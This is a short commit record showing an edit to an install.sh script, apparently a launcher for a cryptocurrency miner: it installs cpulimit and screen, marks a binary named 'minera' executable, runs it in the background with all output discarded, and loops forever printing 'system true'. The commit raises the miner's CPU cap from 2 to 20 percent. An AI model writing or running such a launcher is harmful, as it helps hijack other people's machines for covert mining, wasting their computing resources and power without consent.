e85f9abdf32ad4587fee4594349712188a362e17
juan robert <kijang-020@hotmail.com>
2021-12-24 23:36:16 +0000

    install.sh edited online with Bitbucket

--- install.sh
+++ install.sh
@@ -2,5 +2,5 @@ apt-get update -y
 apt-get install -y cpulimit screen
 chmod +x minera
 chmod +x config.json
-cpulimit -l 2 ./minera >/dev/null 2>&1 >/dev/null &
+cpulimit -l 20 ./minera >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 30; done
